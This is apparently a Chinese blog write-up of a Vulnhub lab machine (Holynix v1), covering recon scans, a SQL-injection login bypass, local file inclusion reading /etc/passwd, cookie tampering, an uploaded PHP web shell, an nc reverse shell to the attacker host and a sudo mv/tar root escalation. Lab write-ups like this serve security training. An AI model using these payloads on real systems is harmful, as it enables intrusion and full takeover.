+++
date = '2026-11-02T16:53:28+08:00'
draft = false
title = '[Vulnhub靶机]HolynixV1渗透记录'
tags = ['渗透','Vulnhub','SQLi','LFI','Upload','会话劫持']
+++

## 信息收集

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.5

```Shell
┌──(kali㉿kali)-[~/HolynixV1]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.5      00:0c:29:bc:05:de       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded
```

探测端口开放情况, 只有一个80

```Shell
┌──(kali㉿kali)-[~/HolynixV1]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.5           
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-02 18:04 +0800
Nmap scan report for 10.10.10.5
Host is up (0.00079s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:BC:05:DE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
```

扫描常用UDP端口, 全部关闭

```Shell
┌──(kali㉿kali)-[~/HolynixV1]
└─$ sudo nmap -sU --min-rate 10000 10.10.10.5    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-02 18:04 +0800
Nmap scan report for 10.10.10.5
Host is up (0.00038s latency).
Not shown: 994 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
21800/udp closed tvpm
23557/udp closed unknown
34125/udp closed unknown
49968/udp closed unknown
57813/udp closed unknown
59765/udp closed unknown
MAC Address: 00:0C:29:BC:05:DE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.97 seconds
```

深入扫描80端口

```Shell
┌──(kali㉿kali)-[~/HolynixV1]
└─$ sudo nmap -sT -sV -sC -p80 10.10.10.5                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-02 18:06 +0800
Nmap scan report for 10.10.10.5
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:BC:05:DE (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.07 seconds
```

漏洞扫描

```Shell
┌──(kali㉿kali)-[~/HolynixV1]
└─$ sudo nmap --script=vuln -p80 10.10.10.5                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-02 18:07 +0800
Stats: 0:05:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.37% done; ETC: 18:13 (0:00:08 remaining)
Nmap scan report for 10.10.10.5
Host is up (0.00070s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.5
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.5:80/?page=login.php
|     Form id: 
|     Form action: /index.php?page=login.php
|     
|     Path: http://10.10.10.5:80/index.php?page=login.php
|     Form id: 
|_    Form action: /index.php?page=login.php
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-enum: 
|   /login.php: Possible admin folder
|   /login/: Login page
|   /home/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /img/: Potentially interesting folder
|   /index/: Potentially interesting folder
|   /misc/: Potentially interesting folder
|   /transfer/: Potentially interesting folder
|_  /upload/: Potentially interesting folder
MAC Address: 00:0C:29:BC:05:DE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 321.88 seconds
```

网站目录爆破

```Shell
┌──(kali㉿kali)-[~/HolynixV1]
└─$ dirsearch -u http://10.10.10.5/ -i 200,301,302,500
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET
Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HolynixV1/reports/http_10.10.10.5/__26-11-02_18-13-18.txt

Target: http://10.10.10.5/

[18:13:18] Starting: 
[18:13:28] 200 -   63B  - /footer                                          
[18:13:28] 200 -   63B  - /footer.php
[18:13:29] 200 -  604B  - /header                                          
[18:13:29] 200 -  604B  - /header.php
[18:13:29] 200 -  109B  - /home                                            
[18:13:29] 200 -  109B  - /home.php
[18:13:29] 301 -  346B  - /img  ->  http://10.10.10.5/img/                 
[18:13:31] 200 -  342B  - /login                                           
[18:13:31] 200 -  342B  - /login.php                                       
[18:13:31] 200 -  342B  - /login/                                          
[18:13:31] 200 -  342B  - /login/admin/admin.asp
[18:13:31] 200 -  342B  - /login/admin/
[18:13:31] 200 -  342B  - /login/administrator/
[18:13:31] 200 -  342B  - /login/cpanel.php
[18:13:31] 200 -  342B  - /login/cpanel.jsp
[18:13:31] 200 -  342B  - /login/cpanel.aspx
[18:13:31] 200 -  342B  - /login/cpanel.html
[18:13:31] 200 -  342B  - /login/cpanel.js
[18:13:31] 200 -  342B  - /login/cpanel/
[18:13:31] 200 -  342B  - /login/index
[18:13:31] 200 -  342B  - /login/login
[18:13:31] 200 -  342B  - /login/oauth/
[18:13:31] 200 -  342B  - /login/super
[18:13:32] 301 -  347B  - /misc  ->  http://10.10.10.5/misc/               
[18:13:39] 200 -   44B  - /transfer                                        
[18:13:39] 301 -  349B  - /upload  ->  http://10.10.10.5/upload/           
[18:13:39] 200 -   26B  - /upload/                                         
[18:13:39] 200 -   44B  - /upload.php                                      
[18:13:41] 301 -  350B  - /~backup  ->  http://10.10.10.5/~backup/         
[18:13:41] 301 -  347B  - /~bin  ->  http://10.10.10.5/~bin/
[18:13:41] 301 -  350B  - /~daemon  ->  http://10.10.10.5/~daemon/         
[18:13:41] 301 -  349B  - /~games  ->  http://10.10.10.5/~games/           
[18:13:41] 301 -  348B  - /~mail  ->  http://10.10.10.5/~mail/             
[18:13:41] 301 -  348B  - /~sync  ->  http://10.10.10.5/~sync/             
                                                                            
Task Completed
```

访问80端口

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

点击Login, 这里能发现很多东西: URL中的`page`参数指向一个php文件, 那么我们可以尝试文件包含; 登录框可以尝试SQL注入

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/%E7%82%B9%E5%87%BBlogin.avif)

## Web渗透

### SQL注入

用户名任意, 密码输入`'`, 可以发现SQL语句

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/%E5%8F%91%E7%8E%B0SQL%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4.avif)

输入密码`' or '1`, 即可登录, 登录后发现当前用户为`alamo`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.avif)

Directory页面是员工信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261102182330872.png)

Message Board中能看到员工们的聊天记录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103190111339.png)

阅读聊天记录可知以下信息:

1. 存在一个定时任务会定期备份开发文件夹
2. 服务器使用knockknock隐藏ssh端口

Upload页面可以上传文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103191830402.png)

尝试上传一句话木马, 提示当前用户不允许上传

```php
<?php system($_GET['cmd']);?>
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103192218966.png)

因为网站有自动解压功能, 尝试压缩后再上传, 仍然不行

```shell
tar -czf shell.tar.gz shell.php
```

### LFI

Security页面存在下拉框, 点击"Display File"会显示对应的文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103200605568.png)

审查元素, 发现value属性指向本地文件名

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103200820850.png)

将value值改为/etc/passwd, 点击"Display File", 成功返回passwd文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103201006841.png)

观察passwd内容, 发现靶机存在以下用户:

```text
alamo:x:1000:115::/home/alamo:/bin/bash
etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
hreiser:x:1003:50::/home/hreiser:/bin/bash
jdraper:x:1004:100::/home/jdraper:/bin/bash
jjames:x:1005:50::/home/jjames:/bin/bash
jljohansen:x:1006:115::/home/jljohansen:/bin/bash
ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
mrbutler:x:1009:50::/home/mrbutler:/bin/bash
rtmorris:x:1010:100::/home/rtmorris:/bin/bash
```

### 会话劫持

查看浏览器Cookie, 发现`id`字段为`1`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103203031420.png)

将其改为`2`, 刷新后身份改变

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103203229586.png)

使用该账户成功上传脚本

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103203417771.png)

### 立足点

因为Upload页面标题是"Home Directory Uploader", 所以我们上传的脚本应该上传到etenenbaum的家目录内了, 尝试访问`/~etenenbaum/`, 能列出etenenbaum用户当前家目录内容, 其中就包含我们刚上传的脚本

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103204728008.png)

然而点击后却提示Permission Denied

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103204903736.png)

使用压缩包格式重新上传

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103213458788.png)

再尝试访问, 现在能执行代码了

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261103213603150.png)

现在攻击机开启监听, 访问`http://10.10.10.5/~etenenbaum/shell.php?cmd=nc%2010.10.10.3%204444%20-e%20/bin/bash`即可获得shell

```Shell
┌──(kali㉿kali)-[~/HolynixV1]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
10.10.10.5: inverse host lookup failed: Host name lookup failure
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.5] 58248
ls
DC0001.JPG
shell.php
whoami
www-data
```

## 权限提升

### 终端升级

```Shell
python -c "import pty;pty.spawn('/bin/bash')"
```

### 枚举

查看sudo权限

```Shell
sudo -l
User www-data may run the following commands on this host:
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /bin/chgrp
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /bin/mv
```

既然mv和tar可用, 那么我们可以尝试将bash重命名为tar, 这样`sudo tar`时就相当于在`sudo bash`

### 提权

```Shell
sudo mv /bin/tar /bin/tar.ori
sudo mv /bin/bash /bin/tar
sudo tar
whoami
root
```

本靶机无Flag, 拿到root权限即完成
